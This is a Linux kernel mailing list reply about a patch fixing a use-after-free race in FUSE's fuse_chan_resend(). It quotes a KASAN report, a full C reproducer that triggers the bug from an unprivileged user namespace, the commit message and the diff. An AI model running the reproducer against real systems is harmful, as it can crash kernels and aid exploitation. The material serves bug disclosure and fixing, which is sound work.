Received: from mail-oa1-f51.google.com (mail-oa1-f51.google.com [209.85.160.51])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 48C4443A7F2
	for <fuse-devel@lists.linux.dev>; Mon, 17 Aug 2026 13:31:04 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.160.51
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786973468; cv=none; b=tPXycxH0BgdRq+wfmDp8dKxbBNSWD8Q5p7ZqEWXSjaXEo8bJWaFFbkZ6JfENwkVl0wZru9x7tM+mGuOD4VfyBay0wYZtARHeTKwczWTRglAkHNJ77aZ0LQPOUjPlPvbC4bXErLwwhpdiQk+SaopzDzddfUnPkLnOn+lsqtEw7/o=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786973468; c=relaxed/simple;
	bh=8IBvZr1BrERhg0g8hwVFwP+/LbZCNnZCW5yYX06MmVg=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=g/nbxL/TTJ3AL+wplNbTN0Ih7PThugvicHKdu0IXiaMApC7Y8rTKJKTt2Hve2TlR3QkNsyuh/ykFjWITk0a7O+24p0OjLbSmbyYHCB7sDy0UjyXY3nG2hM2wpw1Xx0+0IP8aFhhfqsw7MGHkuKWHVohydYibbBIVCCpvvJnndQ0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=n+J2Tea8; arc=none smtp.client-ip=209.85.160.51
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="n+J2Tea8"
Received: by mail-oa1-f51.google.com with SMTP id 586e51a60fabf-456395f4e7bso2498016fac.0
        for <fuse-devel@lists.linux.dev>; Mon, 17 Aug 2026 06:31:04 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1786973463; x=1787578263; darn=lists.linux.dev;
        h=content-transfer-encoding:content-type:in-reply-to:from
         :content-language:references:cc:to:subject:user-agent:mime-version
         :date:message-id:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=h1FI+wEpIatZzHciZeaLVs9VCFDcR6LSlgHgmJ0E52o=;
        b=n+J2Tea8EkuWUKUXqzmHhouzC/PsdYUJmZQeGWK8NDO23UFu8xOyCcbPLTmM/CEmrd
         w9jQ1GTtJ8PZZmNrJLwb/AFDDItP6XWjq+ssVjJfEs8FUv/MbGRO/7jhkekGANTAy4vM
         f7hlmCywQMOaz3Ew9MwKPj+m9dyzEJRHIv54+xN3XVJvvkfPpcwQ1TBBM7oFryjXLTts
         ZcOv9kf/6n5+2aDPOKny+SMK2+qeHMwJ/+J19RnDsZvwTPy99yZV+HEBb5MVadUMQOMP
         b3IXoaIZbgab9EHoxLp/3behY0O1y8RYmBc+2Ud2CC61DKuzA5vGlC+X5u9Pdli4hn7G
         WQNg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786973463; x=1787578263;
        h=content-transfer-encoding:content-type:in-reply-to:from
         :content-language:references:cc:to:subject:user-agent:mime-version
         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=h1FI+wEpIatZzHciZeaLVs9VCFDcR6LSlgHgmJ0E52o=;
        b=pTG2btD8RZtOFPtvEk7NverQQW1ibAj8gRg+qd6ntK7IEkwdyhcMHvwBOuGGDgDF9w
         2+dtzN8QrIRf7O1jH/a0My/E2ekCBwCltWzxCmFbuIumJvcBugAVHYoqCjNcIj6BtqRZ
         1nDDA1K+9Cu54mIRuQ56krlCVnF0ucKXNdpOwB31k017EXjsjcrz73rxTmWLNiCw6dXp
         P17nnDZannr+IEjt98sERzMPIs6YCvx8YyQUwavfjvafnhVlDMrZWeL4xUrM4PeQlgqp
         0ryXEDBCcrPyxyiGW5/kd2abaTnHuJfF68FGvzW/T+fbSOG0wcjmtNTGHKVz8Y70g9fX
         TCKg==
X-Forwarded-Encrypted: i=1; AHgh+RpVeDEkipypqavWiMe4lrgv/NzteUg4lKH0wOMcKBsrl8zDjV+QOan5ndxEbG+yRcwJZxrW2O0T4AHi@lists.linux.dev
X-Gm-Message-State: AOJu0YxI3/r3ybrtA3tfs90/6oTYVWikDLo2uV8dimxDuFKHlFDCMaUq
	0qa/bEOchHpUR4qFoMY9nPTNRtaGsb5uEzXV3QOE2kK4zxbOoPUKXtsP
X-Gm-Gg: AR+sD10QWVqX2OT+E567LhMjLnDQ9Kb+mz6HOaJbJJeuHum9beour+CRqF+uGrL8ka2
	h7FYg3Vz/00Vug/WEM9JK5g4A6zQcIJlCqBkamv6v7j7oEwS+A8jxgDkKdeYJwLNgK315hSJYms
	YR/rnQzBDnz3KOlHajUG2m7lfHFCfbZoBcRy16AUhOv/qnXhMwclVxQk18FZ9MSS1PVi1SV0tpe
	RrxEhLhLXIxJODrFAgoj80FJZud6ai3kz8xkYS8afrjhUJl87CabUyDuRhFJtd86cgBlXQzlqSd
	++cVdsGxduR1Kcmt8ZsT2UpRsQP5kGnYJ1TiI07nmLDGf7X3fnLGAdUF6fIBha9ckBp3/P1VP+2
	/XnzXhKZXv/YKg3JjU4sOSrDE+EWAA6FphNq4NyXUedMT14BfXSVmfjtrEFLyVzlzo2z5WAZSqd
	ePydO9yZS7MVdkAFAzlNwtJlUVimEcv0XwPeIUZkIqMV3zVMOVoq+vPTYhKRxH4VCVIrCQ0S1V5
	9v6CuHH4yZRMMeiLu1SlsVNQL/EZQGnJZ0aVb83/MnhgOH53cGk5AO7reMN5Rk=
X-Received: by 2002:a05:6820:c86:b0:6a1:3e91:dcac with SMTP id 006d021491bc7-6b0d7310c34mr23033990eaf.31.1786973462870;
        Mon, 17 Aug 2026 06:31:02 -0700 (PDT)
Received: from ?IPV6:2400:79e0:1203:64b0:ac55:5181:f7f4:70ac? ([2400:79e0:1203:64b0:ac55:5181:f7f4:70ac])
        by smtp.gmail.com with ESMTPSA id 006d021491bc7-6b1165f2424sm1581799eaf.7.2026.08.17.06.30.59
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Mon, 17 Aug 2026 06:31:02 -0700 (PDT)
Message-ID: <285583d1-f08e-4300-8048-9def694deaf7@gmail.com>
Date: Mon, 17 Aug 2026 21:30:57 +0800
Precedence: bulk
X-Mailing-List: fuse-devel@lists.linux.dev
List-Id: <fuse-devel.lists.linux.dev>
List-Subscribe: <mailto:fuse-devel+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:fuse-devel+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH 1/2] fuse: set FR_PENDING under fiq->lock in
 fuse_chan_resend()
To: Jun Yang <littleddfu@gmail.com>, Miklos Szeredi <miklos@szeredi.hu>,
 fuse-devel@lists.linux.dev
Cc: Baokun Li <libaokun@linux.alibaba.com>, Jun Yang <junvyyang@tencent.com>,
 Zhao Chen <winters.zc@antgroup.com>, linux-kernel@vger.kernel.org,
 stable@kernel.org, TencentOS Corvus AI <corvus@tencent.com>
References: <20260804091757.503476-1-junvyyang@tencent.com>
 <20260804091757.503476-2-junvyyang@tencent.com>
 <a9fbbe88-3d24-4ff5-9e47-89e3b8916450@gmail.com>
 <20260817102545.508771-1-junvyyang@tencent.com>
Content-Language: en-US
From: Tang Yizhou <tangyeechou@gmail.com>
In-Reply-To: <20260817102545.508771-1-junvyyang@tencent.com>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit


On 17/8/26 6:25 pm, Jun Yang wrote:
> Below are the KASAN report, the reproducer, and the revised commit message.
> The issue reproduces reliably in local testing; one decoded KASAN report follows:
> 
> --- KASAN report ---
> 
>   BUG: KASAN: slab-use-after-free in fuse_dev_do_read+0x1c98/0x1d40
>     fuse_read_interrupt                     fs/fuse/dev.c:1380 [inlined]
>     fuse_dev_do_read                        fs/fuse/dev.c:1567
>   Read of size 8 at addr ff11000103da6b20 by task poc/14975
>   CPU: 2 UID: 1000 PID: 14975 Comm: poc Tainted: G    B   W           7.2.0-rc7-clean-24ef02f934ee #2 PREEMPT(lazy)
>   Call Trace:
>    fuse_dev_do_read+0x1c98/0x1d40          fs/fuse/dev.c:1380 [inlined]
>                                              fs/fuse/dev.c:1567
>    fuse_dev_read+0x161/0x1d0               fs/fuse/dev.c:1694
>    vfs_read+0x700/0xab0                    fs/read_write.c:574
>    ksys_read+0x114/0x250                   fs/read_write.c:716
>    do_syscall_64+0xe0/0x5a0                arch/x86/entry/syscall_64.c:94
> 
>   Allocated by task 14945:
>    fuse_request_alloc+0x22/0x210           fs/fuse/dev.c:48
>    fuse_get_req+0x1e4/0x360                fs/fuse/dev.c:130
>    fuse_chan_send+0x105/0x5f0              fs/fuse/dev.c:822
>    fuse_lookup_name+0x38d/0x830            fs/fuse/dir.c:577
>    vfs_statx+0xd2/0x3b0                    fs/stat.c:353
> 
>   Freed by task 14945:
>    kmem_cache_free+0xca/0x3f0              mm/slub.c:6504
>    fuse_chan_send+0x438/0x5f0              fs/fuse/dev.c:839
>    fuse_lookup_name+0x38d/0x830            fs/fuse/dir.c:577
>    vfs_statx+0xd2/0x3b0                    fs/stat.c:353
> 
>   The buggy address belongs to the object at ff11000103da6ae0
>    which belongs to the cache fuse_request of size 168
> 
> --- reproducer ---
> 
> #define _GNU_SOURCE
> #include <errno.h>
> #include <fcntl.h>
> #include <pthread.h>
> #include <sched.h>
> #include <signal.h>
> #include <stdatomic.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/mount.h>
> #include <sys/prctl.h>
> #include <sys/stat.h>
> #include <sys/wait.h>
> #include <unistd.h>
> 
> struct fuse_in_header {
> 	uint32_t len;
> 	uint32_t opcode;
> 	uint64_t unique;
> 	uint64_t nodeid;
> 	uint32_t uid;
> 	uint32_t gid;
> 	uint32_t pid;
> 	uint16_t total_extlen;
> 	uint16_t padding;
> };
> 
> struct fuse_out_header {
> 	uint32_t len;
> 	int32_t error;
> 	uint64_t unique;
> };
> 
> struct fuse_init_out {
> 	uint32_t major, minor, max_readahead, flags;
> 	uint16_t max_background, congestion_threshold;
> 	uint32_t max_write, time_gran;
> 	uint16_t max_pages, map_alignment;
> 	uint32_t flags2;
> 	uint32_t max_stack_depth;
> 	uint16_t request_timeout;
> 	uint16_t unused[11];
> };
> 
> #define FUSE_INIT 26
> #define FUSE_NOTIFY_RESEND 7
> #define FUSE_DEV_IOC_MAGIC 229
> #define FUSE_DEV_IOC_CLONE _IOR(FUSE_DEV_IOC_MAGIC, 0, uint32_t)
> #define FUSE_PARALLEL_DIROPS (1 << 18)
> #define FUSE_MAX_PAGES (1 << 22)
> 
> enum {
> 	VICTIM_THREADS = 512,
> 	CLONE_FDS = 96,
> 	RESEND_ROUNDS = 4,
> 	RUN_SECONDS = 120,
> 	SETTLE_US = 20000,
> };
> 
> static int fuse_fd = -1;
> static atomic_int daemon_stop;
> static atomic_int race_start;
> static atomic_int parked;
> static long total_iterations;
> static long total_parked;
> static long total_resends;
> static long total_resend_failures;
> 
> static long now_ms(void)
> {
> 	struct timespec ts;
> 
> 	clock_gettime(CLOCK_MONOTONIC, &ts);
> 	return ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
> }
> 
> static void pin_cpu(int cpu)
> {
> 	cpu_set_t set;
> 
> 	CPU_ZERO(&set);
> 	CPU_SET(cpu, &set);
> 	sched_setaffinity(0, sizeof(set), &set);
> }
> 
> static int write_file(const char *path, const char *value)
> {
> 	int fd;
> 	ssize_t len = strlen(value);
> 
> 	fd = open(path, O_WRONLY);
> 	if (fd < 0)
> 		return -1;
> 	if (write(fd, value, len) != len) {
> 		close(fd);
> 		return -1;
> 	}
> 	close(fd);
> 	return 0;
> }
> 
> static void *fuse_daemon(void *unused)
> {
> 	static char buf[1 << 20];
> 
> 	(void)unused;
> 	pin_cpu(2);
> 
> 	while (!atomic_load(&daemon_stop)) {
> 		struct fuse_in_header *in;
> 		ssize_t n = read(fuse_fd, buf, sizeof(buf));
> 
> 		if (n < 0) {
> 			if (errno == EINTR || errno == EAGAIN)
> 				continue;
> 			break;
> 		}
> 		if ((size_t)n < sizeof(*in))
> 			continue;
> 
> 		in = (void *)buf;
> 		if (in->opcode == FUSE_INIT) {
> 			struct {
> 				struct fuse_out_header out;
> 				struct fuse_init_out init;
> 			} reply = { 0 };
> 
> 			reply.out.len = sizeof(reply);
> 			reply.out.unique = in->unique;
> 			reply.init.major = 7;
> 			reply.init.minor = 31;
> 			reply.init.max_readahead = 4096;
> 			reply.init.flags = FUSE_PARALLEL_DIROPS |
> 					   FUSE_MAX_PAGES;
> 			reply.init.max_background = UINT16_MAX;
> 			reply.init.congestion_threshold = UINT16_MAX;
> 			reply.init.max_write = 65536;
> 			reply.init.time_gran = 1;
> 			reply.init.max_pages = 32;
> 			if (write(fuse_fd, &reply, sizeof(reply)) < 0)
> 				perror("FUSE_INIT reply");
> 			continue;
> 		}
> 
> 		/* Leave every non-INIT request in fpq->processing[]. */
> 		atomic_fetch_add(&parked, 1);
> 	}
> 	return NULL;
> }
> 
> static void wait_for_race(void)
> {
> 	while (!atomic_load_explicit(&race_start, memory_order_acquire))
> 		__asm__ __volatile__("pause" ::: "memory");
> }
> 
> struct race {
> 	pid_t victim;
> 	long resends;
> 	long failures;
> };
> 
> static void *resend_requests(void *arg)
> {
> 	struct race *race = arg;
> 	struct fuse_out_header out = {
> 		.len = sizeof(out),
> 		.error = FUSE_NOTIFY_RESEND,
> 	};
> 	int i;
> 
> 	pin_cpu(0);
> 	wait_for_race();
> 	for (i = 0; i < RESEND_ROUNDS; i++) {
> 		if (write(fuse_fd, &out, sizeof(out)) == sizeof(out))
> 			race->resends++;
> 		else
> 			race->failures++;
> 	}
> 	return NULL;
> }
> 
> static void *kill_victim(void *arg)
> {
> 	struct race *race = arg;
> 
> 	pin_cpu(3);
> 	wait_for_race();
> 	kill(race->victim, SIGKILL);
> 	return NULL;
> }
> 
> struct victim_arg {
> 	int index;
> };
> 
> static char victim_root[64];
> 
> static void *victim_request(void *arg)
> {
> 	struct victim_arg *victim = arg;
> 	char path[96];
> 	struct stat st;
> 
> 	snprintf(path, sizeof(path), "%s/f%d", victim_root, victim->index);
> 	stat(path, &st);
> 	for (;;)
> 		pause();
> 	return NULL;
> }
> 
> static void run_victim(const char *mountpoint)
> {
> 	static struct victim_arg args[VICTIM_THREADS];
> 	pthread_attr_t attr;
> 	pthread_t thread;
> 	int i;
> 
> 	prctl(PR_SET_PDEATHSIG, SIGKILL);
> 	snprintf(victim_root, sizeof(victim_root), "%s", mountpoint);
> 	pthread_attr_init(&attr);
> 	pthread_attr_setstacksize(&attr, 64 * 1024);
> 	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
> 	for (i = 0; i < VICTIM_THREADS; i++) {
> 		args[i].index = i;
> 		if (pthread_create(&thread, &attr, victim_request, &args[i]))
> 			break;
> 	}
> 	pthread_attr_destroy(&attr);
> 	for (;;)
> 		pause();
> }
> 
> static int wait_for_parked_requests(void)
> {
> 	long start = now_ms();
> 	int idle = 0;
> 	int last = -1;
> 
> 	while (atomic_load(&parked) < VICTIM_THREADS &&
> 	       now_ms() - start < 3000) {
> 		int current = atomic_load(&parked);
> 
> 		idle = current == last ? idle + 1 : 0;
> 		last = current;
> 		if (idle > 30)
> 			break;
> 		usleep(1000);
> 	}
> 	return atomic_load(&parked);
> }
> 
> static int run_iteration(int iteration)
> {
> 	char mountpoint[64];
> 	char options[128];
> 	int clone_fds[CLONE_FDS];
> 	int clone_count = 0;
> 	int parked_count;
> 	int rc = -1;
> 	int i;
> 	pid_t victim = -1;
> 	pthread_t daemon_thread, resend_thread, kill_thread;
> 	bool daemon_started = false;
> 	bool resend_started = false;
> 	bool kill_started = false;
> 	struct race race = { 0 };
> 
> 	atomic_store(&daemon_stop, 0);
> 	atomic_store(&parked, 0);
> 	snprintf(mountpoint, sizeof(mountpoint), "/tmp/fuse-%d", iteration);
> 	if (mkdir(mountpoint, 0755) && errno != EEXIST)
> 		goto out;
> 
> 	fuse_fd = open("/dev/fuse", O_RDWR);
> 	if (fuse_fd < 0)
> 		goto out;
> 
> 	snprintf(options, sizeof(options),
> 		 "fd=%d,rootmode=40000,user_id=0,group_id=0", fuse_fd);
> 	if (mount("fuse", mountpoint, "fuse", 0, options))
> 		goto out;
> 
> 	victim = fork();
> 	if (!victim) {
> 		run_victim(mountpoint);
> 		_exit(0);
> 	}
> 	if (victim < 0)
> 		goto out;
> 
> 	/* Cloned devices widen fuse_chan_resend()'s fch->lock section. */
> 	for (i = 0; i < CLONE_FDS; i++) {
> 		uint32_t old_fd = fuse_fd;
> 		int fd = open("/dev/fuse", O_RDWR);
> 
> 		if (fd < 0)
> 			break;
> 		if (ioctl(fd, FUSE_DEV_IOC_CLONE, &old_fd)) {
> 			close(fd);
> 			break;
> 		}
> 		clone_fds[clone_count++] = fd;
> 	}
> 
> 	if (pthread_create(&daemon_thread, NULL, fuse_daemon, NULL))
> 		goto out;
> 	daemon_started = true;
> 
> 	parked_count = wait_for_parked_requests();
> 	if (iteration < 3 || !(iteration % 50))
> 		printf("[+] it=%d parked=%d/%d clones=%d\n", iteration,
> 		       parked_count, VICTIM_THREADS, clone_count);
> 	if (parked_count < VICTIM_THREADS / 2) {
> 		fprintf(stderr, "[!] insufficient parked requests\n");
> 		rc = 0;
> 		goto out;
> 	}
> 	total_parked += parked_count;
> 
> 	race.victim = victim;
> 	atomic_store(&race_start, 0);
> 	if (pthread_create(&resend_thread, NULL, resend_requests, &race))
> 		goto out;
> 	resend_started = true;
> 	if (pthread_create(&kill_thread, NULL, kill_victim, &race))
> 		goto out;
> 	kill_started = true;
> 
> 	usleep(2000);
> 	atomic_store_explicit(&race_start, 1, memory_order_release);
> 	pthread_join(resend_thread, NULL);
> 	resend_started = false;
> 	pthread_join(kill_thread, NULL);
> 	kill_started = false;
> 
> 	/* Let the daemon consume a stale interrupt entry. */
> 	usleep(SETTLE_US);
> 	total_resends += race.resends;
> 	total_resend_failures += race.failures;
> 	rc = 0;
> 
> out:
> 	atomic_store_explicit(&race_start, 1, memory_order_release);
> 	if (resend_started)
> 		pthread_join(resend_thread, NULL);
> 	if (kill_started)
> 		pthread_join(kill_thread, NULL);
> 
> 	atomic_store(&daemon_stop, 1);
> 	for (i = 0; i < clone_count; i++)
> 		close(clone_fds[i]);
> 	if (daemon_started) {
> 		pthread_kill(daemon_thread, SIGUSR1);
> 		pthread_join(daemon_thread, NULL);
> 	}
> 
> 	/* Abort before waitpid(), since some victim threads wait uninterruptibly. */
> 	if (victim > 0) {
> 		umount2(mountpoint, MNT_FORCE);
> 		kill(victim, SIGKILL);
> 		waitpid(victim, NULL, 0);
> 	}
> 	umount2(mountpoint, MNT_FORCE);
> 	umount2(mountpoint, MNT_DETACH);
> 	if (fuse_fd >= 0)
> 		close(fuse_fd);
> 	fuse_fd = -1;
> 	rmdir(mountpoint);
> 	return rc;
> }
> 
> static void interrupt_read(int signal)
> {
> 	(void)signal;
> }
> 
> int main(void)
> {
> 	struct sigaction action = { 0 };
> 	uid_t uid = getuid();
> 	gid_t gid = getgid();
> 	char map[64];
> 	long start;
> 	int iteration;
> 
> 	setvbuf(stdout, NULL, _IOLBF, 0);
> 	action.sa_handler = interrupt_read;
> 	sigemptyset(&action.sa_mask);
> 	sigaction(SIGUSR1, &action, NULL);
> 	signal(SIGPIPE, SIG_IGN);
> 
> 	if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
> 		perror("unshare");
> 		return 2;
> 	}
> 	(void)write_file("/proc/self/setgroups", "deny");
> 	snprintf(map, sizeof(map), "0 %u 1", uid);
> 	if (write_file("/proc/self/uid_map", map))
> 		return 2;
> 	snprintf(map, sizeof(map), "0 %u 1", gid);
> 	if (write_file("/proc/self/gid_map", map))
> 		return 2;
> 	if (getuid())
> 		return 2;
> 	mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
> 
> 	printf("[+] poc: %ds, %d threads, %d clones\n", RUN_SECONDS,
> 	       VICTIM_THREADS, CLONE_FDS);
> 	start = now_ms();
> 	for (iteration = 0; now_ms() - start < RUN_SECONDS * 1000L;
> 	     iteration++) {
> 		if (run_iteration(iteration))
> 			return 2;
> 		total_iterations++;
> 		if (iteration && !(iteration % 50))
> 			printf("[+] progress: iterations=%ld parked=%ld "
> 			       "resends=%ld failures=%ld\n",
> 			       total_iterations, total_parked, total_resends,
> 			       total_resend_failures);
> 	}
> 
> 	printf("[+] DONE iterations=%ld parked=%ld resends=%ld failures=%ld\n",
> 	       total_iterations, total_parked, total_resends,
> 	       total_resend_failures);
> 	return 0;
> }
> 
> ---
> 
> Thanks,
> Jun
> 
> --- commit message ---
> 
> From: Jun Yang <junvyyang@tencent.com>
> Subject: [PATCH v2 1/2] fuse: set FR_PENDING under fiq->lock in
>  fuse_chan_resend()
> 
> fuse_remove_pending_req() checks FR_PENDING while holding fiq->lock and
> removes req->list when the bit is set.
> 
> fuse_chan_resend() first moves requests from fpq->processing to the
> stack-local to_queue list.  It then drops the queue locks and sets
> FR_PENDING before taking fiq->lock and moving the requests to
> fiq->pending.
> 
> This leaves the following race:
> 
>   fuse_chan_resend()              request waiter
> 
>   set_bit(FR_PENDING)
>                                    spin_lock(fiq->lock)
>                                    test FR_PENDING
>                                    list_del(req->list)
>                                    __fuse_put_request(req)
>   access req / walk to_queue
> 
> Take fiq->lock before setting FR_PENDING and keep it held until the
> requests have been added to fiq->pending.  Relative to
> fuse_remove_pending_req(), publishing FR_PENDING and changing the request's
> list ownership are then one fiq->lock-protected transition.  If fiq is
> already disconnected, end the requests without setting FR_PENDING.

Hi Jun,

I think you can read the kernel documentation on submitting patches and look at
how others write patches when solving similar issues. Then send out the updated
patchset.

-- 
Best Regards,
Yi

> 
> Fixes: 760eac73f9f6 ("fuse: Introduce a new notification type for resend pending requests")
> Cc: stable@kernel.org
> Reported-by: TencentOS Corvus AI <corvus@tencent.com>
> Assisted-by: tencentos-corvus-ai:kimi-k3
> Signed-off-by: Jun Yang <junvyyang@tencent.com>
> ---
>  fs/fuse/dev.c | 24 ++++++++++--------------
>  1 file changed, 10 insertions(+), 14 deletions(-)
> 
> diff --git a/fs/fuse/dev.c b/fs/fuse/dev.c
> index 5763a7cd3b37..e62c7ed8bcf4 100644
> --- a/fs/fuse/dev.c
> +++ b/fs/fuse/dev.c
> @@ -1781,26 +1781,22 @@ void fuse_chan_resend(struct fuse_chan *fch)
>  	}
>  	spin_unlock(&fch->lock);
>  
> -	list_for_each_entry_safe(req, next, &to_queue, list) {
> -		set_bit(FR_PENDING, &req->flags);
> -		clear_bit(FR_SENT, &req->flags);
> -		/* mark the request as resend request */
> -		req->in.h.unique |= FUSE_UNIQUE_RESEND;
> -	}
> -
>  	spin_lock(&fiq->lock);
>  	if (!fiq->connected) {
>  		spin_unlock(&fiq->lock);
> -		list_for_each_entry(req, &to_queue, list)
> -			clear_bit(FR_PENDING, &req->flags);
>  		fuse_dev_end_requests(&to_queue);
>  		return;
>  	}
> -	/*
> -	 * Remove interrupt entries for resent requests to prevent stale
> -	 * intr_entry on fiq->interrupts after the request is re-queued.
> -	 */
> -	list_for_each_entry(req, &to_queue, list) {
> +	list_for_each_entry_safe(req, next, &to_queue, list) {
> +		/* must be set under fiq->lock, see fuse_remove_pending_req() */
> +		set_bit(FR_PENDING, &req->flags);
> +		clear_bit(FR_SENT, &req->flags);
> +		/* mark the request as resend request */
> +		req->in.h.unique |= FUSE_UNIQUE_RESEND;
> +		/*
> +		 * Remove interrupt entries for resent requests to prevent stale
> +		 * intr_entry on fiq->interrupts after the request is re-queued.
> +		 */
>  		if (test_bit(FR_INTERRUPTED, &req->flags))
>  			list_del_init(&req->intr_entry);
>  	}



